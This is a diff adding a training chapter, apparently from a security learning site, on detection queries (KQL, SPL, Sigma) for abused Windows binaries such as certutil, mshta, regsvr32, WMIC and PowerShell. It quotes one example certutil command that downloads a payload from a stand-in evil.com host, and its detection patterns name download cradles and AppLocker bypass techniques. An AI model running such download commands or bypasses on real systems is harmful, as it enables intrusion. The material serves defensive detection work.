@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="06">
+  <meta name="module-id" content="lolbas">
+  <title>Detection Queries · LOLBAS · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <a href="../index.html" class="logo-link">
+          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
+        </a>
+        <div class="nav-pill">
+          <span class="nav-pill-name">H3AD-LEARN</span>
+          <span class="nav-pill-sep">·</span>
+          <span class="nav-pill-tagline">DETECTION QUERIES</span>
+        </div>
+      </div>
+      <nav class="header-nav">
+        <a href="../index.html" class="nav-link">Hub</a>
+        <a href="index.html" class="nav-link">LOLBAS</a>
+        <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
+      </nav>
+      <div class="header-actions">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">← LOLBAS</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 06 of 8</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">40 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 7 sections</span>
+      </div>
+    </aside>
+
+    <main class="chapter-body" id="chapterBody">
+      <article>
+        <header class="chapter-header">
+          <div class="chapter-meta">
+            <span class="badge-module mono">CHAPTER 06</span>
+            <span class="badge-time muted mono">40 MIN READ</span>
+            <span class="badge-diff badge-intermediate">INTERMEDIATE</span>
+          </div>
+          <h1 class="chapter-title">Detection Queries</h1>
+          <p class="chapter-intro">Strategy without syntax is incomplete. This chapter delivers production-ready KQL, SPL, and Sigma queries for the most commonly abused LOLBins -- certutil, mshta, regsvr32, BITS, WMIC, PowerShell, rundll32, and installutil. Each query includes tuning notes and the suppression conditions you will need before deploying to production.</p>
+          <div class="chapter-tags">
+            <span class="tag">KQL</span>
+            <span class="tag">Sigma</span>
+            <span class="tag">SPL</span>
+            <span class="tag">Sentinel</span>
+            <span class="tag">detection queries</span>
+          </div>
+        </header>
+
+        <!-- SECTION 1 -->
+        <section class="content-section" id="query-foundations">
+          <h2>Query Foundations</h2>
+          <p>Effective LOLBin queries share one hard requirement: full CommandLine logging. Without it, you can detect that certutil ran but not whether it ran <code>-hashfile</code> or <code>-urlcache -f http://evil.com/p.exe</code>. CommandLine is what separates benign from malicious. Verify that Sysmon EID 1 is logging CommandLine in your environment -- or that your EDR DeviceProcessEvents table is populated -- before deploying any query in this chapter.</p>
+          <p>Every query in this chapter follows the same structural logic: filter by image or filename, then filter by CommandLine pattern, then add context (parent process, account), then project the fields that matter, then order by timestamp descending.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Format</th><th>Primary Platform</th><th>Notes</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>KQL DeviceProcessEvents</td><td>MDE / Sentinel with MDE connector</td><td>Highest fidelity; native EDR telemetry</td></tr>
+                <tr><td>KQL SecurityEvent</td><td>Sentinel with Sysmon forwarding</td><td>Requires Sysmon deployed and events forwarded</td></tr>
+                <tr><td>SPL</td><td>Splunk with Sysmon index</td><td>Adapt index name to your environment</td></tr>
+                <tr><td>Sigma</td><td>Vendor-neutral</td><td>Convert to any platform via sigma-cli</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p>All queries start broad. Add suppression conditions incrementally as legitimate patterns are identified in your environment. A query producing zero results either has no matching activity or is over-suppressed. A query with zero false positives after week one is worth auditing -- the most common reason is an overly narrow pattern missing real variants.</p>
+        </section>
+
+        <!-- SECTION 2 -->
+        <section class="content-section" id="certutil-queries">
+          <h2>certutil.exe Detection Queries</h2>
+          <p>Three queries covering the three primary certutil abuse scenarios: direct download cradle, network-correlated cradle (highest confidence), and encode/decode obfuscation.</p>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// certutil download cradle -- MDE DeviceProcessEvents
+DeviceProcessEvents
+| where FileName =~ "certutil.exe"
+| where ProcessCommandLine has_any ("-urlcache", "-decode", "-encode")
+    or ProcessCommandLine has "http"
+| extend ParentProcess = InitiatingProcessFileName
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, ParentProcess
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// certutil with network correlation -- Sentinel + Sysmon (EID 1 + EID 3 join)
+let certutil_spawn = SecurityEvent
+| where EventID == 1 and CommandLine contains "certutil"
+| project TimeGenerated, Computer, ProcessId, CommandLine, ParentProcessName;
+let certutil_net = SecurityEvent
+| where EventID == 3 and Image endswith "certutil.exe"
+| project TimeGenerated, Computer, ProcessId, DestinationHostname, DestinationIp;
+certutil_spawn
+| join kind=inner certutil_net on Computer, ProcessId
+| where TimeGenerated1 between (TimeGenerated .. (TimeGenerated + 30s))
+| where DestinationHostname !endswith "microsoft.com"
+    and DestinationHostname !endswith "windows.com"
+| project TimeGenerated, Computer, CommandLine, DestinationHostname, DestinationIp</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SIGMA</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>title: Certutil Encoding or Decoding Files
+id: 2c499245-9b85-4d6c-a0f3-c24f5f30ff62
+status: test
+description: certutil used to encode or decode files, commonly used to obfuscate payloads
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\certutil.exe'
+    CommandLine|contains:
+      - '-encode'
+      - '-decode'
+      - '-urlcache'
+  condition: selection
+falsepositives:
+  - PKI operations (rare on workstations)
+level: high
+tags:
+  - attack.command_and_control
+  - attack.t1105</code></pre>
+          </div>
+
+          <p>Tuning note: add NOT conditions for known-good parents (TrustedInstaller, msiexec during install windows) and known-good destinations (crl.microsoft.com, ocsp.digicert.com, ctldl.windowsupdate.com) before deploying to production alerting. The network correlation query is already scoped to non-Microsoft destinations.</p>
+        </section>
+
+        <!-- SECTION 3 -->
+        <section class="content-section" id="mshta-regsvr32-queries">
+          <h2>mshta.exe and regsvr32.exe Queries</h2>
+          <p>mshta queries target URL-based invocation and suspicious child process spawning. regsvr32 queries target the Squiblydoo technique where a remote COM scriptlet is loaded via scrobj.dll.</p>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// mshta with URL argument -- MDE DeviceProcessEvents
+DeviceProcessEvents
+| where FileName =~ "mshta.exe"
+| where ProcessCommandLine has "http://" or ProcessCommandLine has "https://"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SIGMA</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>title: MSHTA Spawning Suspicious Child Process
+id: a8be5f60-5dc6-4862-8a2c-b43f5b7b0e85
+status: test
+description: mshta.exe spawning cmd, powershell, wscript, cscript, or regsvr32
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith: '\mshta.exe'
+    Image|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+      - '\wscript.exe'
+      - '\cscript.exe'
+      - '\regsvr32.exe'
+  condition: selection
+level: high
+tags:
+  - attack.execution
+  - attack.t1218.005</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// regsvr32 Squiblydoo -- MDE DeviceProcessEvents
+DeviceProcessEvents
+| where FileName =~ "regsvr32.exe"
+| where ProcessCommandLine has "http"
+    and ProcessCommandLine has_any ("/s", "/u", "/i")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SIGMA</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>title: Regsvr32 Loading Remote COM Scriptlet (Squiblydoo)
+id: c3de0ae6-3f48-4c31-8c59-7db0ac30c70f
+status: test
+description: regsvr32 with /i and a URL -- Squiblydoo AppLocker bypass via scrobj.dll
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\regsvr32.exe'
+    CommandLine|contains: 'http'
+    CommandLine|contains:
+      - '/i:'
+      - '/i '
+  condition: selection
+level: critical
+tags:
+  - attack.defense_evasion
+  - attack.t1218.010</code></pre>
+          </div>
+        </section>
+
+        <!-- SECTION 4 -->
+        <section class="content-section" id="bits-wmic-queries">
+          <h2>BITS and WMIC Queries</h2>
+          <p>BITS queries cover bitsadmin command-line transfers and the BITS operational event log (EID 59/60), which captures transfers even when process-level telemetry is unavailable. WMIC queries target remote process creation, the primary lateral movement use case.</p>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SPL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// bitsadmin transfer to non-Microsoft destination -- Splunk Sysmon index
+index=sysmon EventCode=1 Image="*\\bitsadmin.exe"
+| where match(CommandLine, "(?i)/transfer|/addfile")
+| eval dest=mvindex(split(CommandLine, " "), -1)
+| where NOT match(dest, "(?i)microsoft\.com|windows\.com|windowsupdate|wsus")
+| table _time, ComputerName, User, CommandLine, dest
+| sort -_time</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// BITS operational event log -- non-Microsoft transfer URL
+// Requires Microsoft-Windows-Bits-Client event forwarding
+Event
+| where Source == "Microsoft-Windows-Bits-Client" and EventID in (59, 60)
+| extend url = extract(@"https?://[^\s]+", 0, RenderedDescription)
+| where url !contains "microsoft.com" and url !contains "windows.com"
+| project TimeGenerated, Computer, EventID, url
+| order by TimeGenerated desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// WMIC remote process creation -- MDE DeviceProcessEvents
+DeviceProcessEvents
+| where FileName =~ "wmic.exe"
+| where ProcessCommandLine has "/node:"
+    and ProcessCommandLine has "process"
+    and ProcessCommandLine has_any ("call create", "call Create")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SIGMA</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>title: WMIC Remote Process Creation
+id: d72a2a52-9f8a-4a5e-b12e-0e7b83f4c5c1
+status: test
+description: wmic.exe targeting a remote host for process execution
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\wmic.exe'
+    CommandLine|contains: '/node:'
+  filter:
+    CommandLine|contains: '/node:localhost'
+  condition: selection and not filter
+level: high
+tags:
+  - attack.lateral_movement
+  - attack.t1047</code></pre>
+          </div>
+        </section>
+
+        <!-- SECTION 5 -->
+        <section class="content-section" id="powershell-queries">
+          <h2>PowerShell LOLScript Queries</h2>
+          <p>Four queries targeting the four highest-value PowerShell abuse patterns: encoded commands, download cradles, hidden-window execution, and Office-spawned PowerShell. The Office spawn query requires no CommandLine filtering -- the parent-child relationship alone is sufficient for alerting.</p>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// PowerShell encoded command (all abbreviation forms) -- MDE DeviceProcessEvents
+DeviceProcessEvents
+| where FileName in~ ("powershell.exe", "pwsh.exe")
+| where ProcessCommandLine has_any ("-enc ", "-EncodedCommand ", "-e ")
+| where strlen(ProcessCommandLine) > 200
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// PowerShell download cradle patterns -- MDE DeviceProcessEvents
+DeviceProcessEvents
+| where FileName in~ ("powershell.exe", "pwsh.exe")
+| where ProcessCommandLine has_any (
+    "iex",
+    "Invoke-Expression",
+    "DownloadString",
+    "DownloadFile",
+    "WebClient",
+    "Net.WebClient",
+    "BitsTransfer")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SIGMA</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>title: PowerShell Hidden Window with NoProfile
+id: 8e55e71c-6bfd-4b28-8013-2b02f9e8c2ba
+status: test
+description: PowerShell with hidden window and NoProfile -- common loader pattern
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith:
+      - '\powershell.exe'
+      - '\pwsh.exe'
+    CommandLine|contains|all:
+      - '-nop'
+      - 'hidden'
+  condition: selection
+level: medium
+tags:
+  - attack.execution
+  - attack.t1059.001</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// Office application spawning PowerShell -- MDE DeviceProcessEvents
+// No CommandLine filter needed; the parent-child pair is the alert condition
+DeviceProcessEvents
+| where FileName in~ ("powershell.exe", "pwsh.exe")
+| where InitiatingProcessFileName in~ (
+    "winword.exe",
+    "excel.exe",
+    "powerpnt.exe",
+    "outlook.exe",
+    "onenote.exe",
+    "mspub.exe")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+        </section>
+
+        <!-- SECTION 6 -->
+        <section class="content-section" id="rundll32-installutil-queries">
+          <h2>rundll32.exe and installutil.exe Queries</h2>
+          <p>rundll32 queries filter by DLL path location rather than binary name, since rundll32 itself runs constantly for legitimate COM operations. installutil queries can afford to be broad -- any execution not loading from System32 or a known installer path warrants review.</p>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// rundll32 loading from user-writable path or executing JavaScript
+DeviceProcessEvents
+| where FileName =~ "rundll32.exe"
+| where ProcessCommandLine matches regex @"(?i)[A-Z]:\\Users\\|%[Tt]emp%|%[Aa]pp[Dd]ata%"
+    or ProcessCommandLine has "javascript:"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">SIGMA</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>title: Rundll32 JavaScript Execution
+id: f2f39d15-a3a4-4b8e-9f35-7c9e8e1e5b2f
+status: test
+description: rundll32.exe executing JavaScript -- used to bypass AppLocker and run unsigned code
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\rundll32.exe'
+    CommandLine|contains: 'javascript:'
+  condition: selection
+level: high
+tags:
+  - attack.defense_evasion
+  - attack.t1218.011</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">KQL</span>
+              <button class="code-copy-btn" aria-label="Copy code">Copy</button>
+            </div>
+            <pre><code>// installutil loading assembly outside system directories
+DeviceProcessEvents
+| where FileName =~ "installutil.exe"
+| where ProcessCommandLine !contains "System32"
+    and ProcessCommandLine !contains "SysWOW64"
+    and ProcessCommandLine !contains "Program Files"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc</code></pre>
+          </div>
+        </section>
+
+        <!-- SECTION 7 -->
+        <section class="content-section" id="query-library">
+          <h2>Building and Maintaining Your Query Library</h2>
+          <p>Individual queries become a library when they are organized, tested, and maintained. The naming convention establishes the index: <code>LOLBIN-CERTUTIL-DOWNLOAD-CRADLE</code>, <code>LOLBIN-MSHTA-CHILD-PROCESS</code>. Each name encodes the binary, the technique, and the specific behavior. Sorting by name then groups all certutil rules together, all mshta rules together, and so on.</p>
+          <p>Each query record should carry: the ATT&amp;CK technique tag, the platform it targets, a confidence rating (high / medium / low), the last test date, and a false positive register documenting every suppressed pattern with a business justification. That last item prevents future analysts from removing suppressions that exist for a reason.</p>
+          <p>QUERYBASE at <a href="https://h3ad-sec.github.io/QUERYBASE/" target="_blank" rel="noopener">h3ad-sec.github.io/QUERYBASE/</a> stores KQL, Sigma, and XQL queries organized by ATT&amp;CK technique -- the natural home for LOLBin queries built from this chapter. TRACERULES at <a href="https://h3ad-sec.github.io/TRACERULES/" target="_blank" rel="noopener">h3ad-sec.github.io/TRACERULES/</a> provides an ATT&amp;CK-organized detection arsenal including T1218 coverage. Use both as a starting point before authoring net-new rules -- the query may already exist in a tested form.</p>
+          <p>Testing with Atomic Red Team provides controlled ground truth. Run the relevant T1218 test case in an isolated lab, verify the query fires, and document the result in the query record. "Fires on Atomic T1218.001 test 2 as of 2026-06-10" is meaningful. "Tested" with no date and no test case is not.</p>
+          <p>Deployment mode matters for prioritization. Run certutil network correlation and mshta child process queries as real-time alerts with immediate notification. Run broad certutil and wscript execution queries as weekly retrospective hunts with lower thresholds and analyst review rather than automated escalation. The same query syntax can serve both modes -- the difference is schedule and severity.</p>
+          <p>Maintenance cadence: quarterly review of the LOLBAS Project (lolbas-project.github.io) for new entries. Each new entry in the catalog is a detection candidate. Coverage gaps compound over time if the library is not actively extended to match what attackers are actively using.</p>
+          <div class="callout-tip"><strong>Tip:</strong> TRACERULES at h3ad-sec.github.io/TRACERULES/ contains ATT&amp;CK-organized detection queries. Use it as a starting point when building LOLBin coverage for a new platform -- the T1218 section covers most binaries in this chapter in multiple query formats.</div>
+        </section>
+
+        <!-- KEY TAKEAWAYS -->
+        <div class="chapter-summary">
+          <h3>Key Takeaways</h3>
+          <ul>
+            <li>KQL DeviceProcessEvents (MDE) provides highest-fidelity LOLBin detection for Microsoft environments. Sigma provides portability across platforms via sigma-cli.</li>
+            <li>certutil queries with network correlation (EID 1 + EID 3 join) achieve near-zero false positive rate on workstations when filtering for non-Microsoft destinations.</li>
+            <li>mshta.exe spawning powershell.exe or cmd.exe is critical severity in virtually all production environments. The parent-child pair alone is sufficient to alert.</li>
+            <li>regsvr32 Squiblydoo detection requires both the /i parameter and a URL in CommandLine. Matching the binary name alone fires on every software install.</li>
+            <li>WMIC /node: with process call create is lateral movement. Detection here catches post-compromise movement using valid credentials -- a phase often missed by endpoint-only detections.</li>
+            <li>PowerShell -enc flag abbreviations (-e, -en, -enc, -EncodedCommand) must all be in the pattern. Matching only -EncodedCommand misses the most common abbreviated forms used in loaders.</li>
+            <li>Query libraries require quarterly maintenance. New LOLBins are added to the LOLBAS Project regularly. Coverage gaps compound over time if not actively managed.</li>
+          </ul>
+        </div>
+
+        <!-- KNOWLEDGE CHECK -->
+        <div class="knowledge-check">
+          <h3 class="kc-title">Knowledge Check</h3>
+          <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+          <div class="kc-question">
+            <p class="kc-prompt">A KQL query fires on every certutil.exe execution across 500 workstations. 99% of results are a WSUS relay running certutil to download updates. What is the correct response?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Delete the query.</button>
+              <button class="kc-option" data-correct="true">B. Add suppression for the WSUS server device name and Microsoft destination domains.</button>
+              <button class="kc-option" data-correct="false">C. Raise alert severity so analysts prioritize reviewing all certutil results.</button>
+              <button class="kc-option" data-correct="false">D. Switch to hash-based detection.</button>
+            </div>
+            <div class="kc-answer">Suppression by device name and network destination preserves detection for all other hosts while silencing the known-good WSUS relay. The query logic is correct -- certutil with outbound HTTP is a meaningful signal. The noise comes from one characterizable legitimate use case. Precision suppression, not rule deletion, is the correct tuning approach.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">Which Sigma field combination best captures regsvr32 Squiblydoo without excessive false positives from normal COM registration?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Image endswith regsvr32.exe alone -- captures all regsvr32 executions.</button>
+              <button class="kc-option" data-correct="true">B. Image endswith regsvr32.exe AND CommandLine contains http -- only fires when a URL is present.</button>
+              <button class="kc-option" data-correct="false">C. ParentImage endswith regsvr32.exe -- targets a different technique entirely.</button>
+              <button class="kc-option" data-correct="false">D. Image endswith regsvr32.exe AND EventID 3 -- wrong log source for process creation rules.</button>
+            </div>
+            <div class="kc-answer">Normal COM registration uses local file paths. No legitimate regsvr32 operation passes an HTTP URL as an argument. Adding CommandLine|contains: http to the regsvr32 Image filter produces very low false positive rate because it only fires on the specific abuse pattern -- loading a remote scriptlet via the /i: parameter. The binary name alone matches every software install.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What advantage does Sigma format provide over platform-specific KQL or SPL for LOLBin detection?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Sigma queries execute faster than native KQL.</button>
+              <button class="kc-option" data-correct="true">B. Sigma can be converted to KQL, SPL, Elasticsearch, QRadar, and other platforms via sigma-cli.</button>
+              <button class="kc-option" data-correct="false">C. Sigma bypasses AMSI during query execution.</button>
+              <button class="kc-option" data-correct="false">D. Sigma rules auto-update when the LOLBAS Project adds new entries.</button>
+            </div>
+            <div class="kc-answer">Sigma is a vendor-neutral detection format. A single Sigma rule converts to any major SIEM or EDR platform's native syntax using sigma-cli (github.com/SigmaHQ/sigma-cli). For organizations using multiple platforms or planning to migrate, Sigma rules represent detection knowledge that survives technology changes. Platform-specific KQL or SPL must be rewritten per platform. That rewrite cost is where coverage gaps typically form.</div>
+          </div>
+        </div>
+
+        <!-- CHAPTER NAV -->
+        <nav class="chapter-nav">
+          <a href="05-detection-strategy.html" class="chapter-nav-prev">← Detection Strategy</a>
+          <a href="07-threat-actor-usage.html" class="chapter-nav-next">Threat Actor Campaigns →</a>
+        </nav>
+      </article>
+    </main>
+  </div>
+
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('06', 7));</script>
+</body>
+</html>
